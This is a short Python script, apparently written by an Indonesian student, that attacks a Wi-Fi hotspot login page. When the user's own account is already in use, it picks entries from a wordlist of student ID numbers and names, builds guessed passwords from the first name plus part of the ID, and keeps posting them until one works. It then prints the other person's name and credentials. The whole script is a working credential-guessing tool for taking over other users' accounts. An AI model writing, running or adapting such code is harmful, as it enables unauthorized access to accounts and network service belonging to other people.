import requests
import random

word = []

f = open('wl.txt', 'r')
isi = f.readlines()
for i in isi:
    p = str(i)
    pp = p.rstrip()
    word.append(pp)

USER = <your_username>
PASW = <your_password>

r = requests.post(url = "http://login.hotspot.com", data = {'username': PASW, 'password': PASW})
resp = str(r.content)
if resp.find('sessions') > 0:
    print ('Your account has been used..')
    print ('Logging in with random account....')
    while True:
        i = int(random.random()*100)
        if i < len(word) - 1:
            i = word[i]
            str(i)
            val = i.split(':')
            nis = val[0].split(' ')
            nama = val[1].split(' ')

            nama_depan = str(nama[0])
            nis_lengkap = val[0].replace(' ', '')
            nis_akhir = str(nis[3])

            username = nis_lengkap
            password = nama_depan + nis_akhir

            print ("Trying %s with password %s" % (username, password))

            URL = "http://login.hotspot.com"
            DATA = {'username': username, 'password': password}
            r = requests.post(url = URL, data = DATA)
            response = str(r.content)
            # print (response)
            res_salah = response.find('invalid')
            res_session = response.find('sessions')
            if res_salah > 0:
                print ("Substring invalid found on index ", res_salah)
                print ("Password Salah")
            elif res_session > 0:
                print ("Sudah ada session")
            elif res_salah == -1 and res_session == -1:
                print ("LOGGED IN as %s with username %s password %s" % (str(val[1]), username, password))
                break
else:
    print ("LOGGED IN WITH YOUR OWN ACCOUNT :D")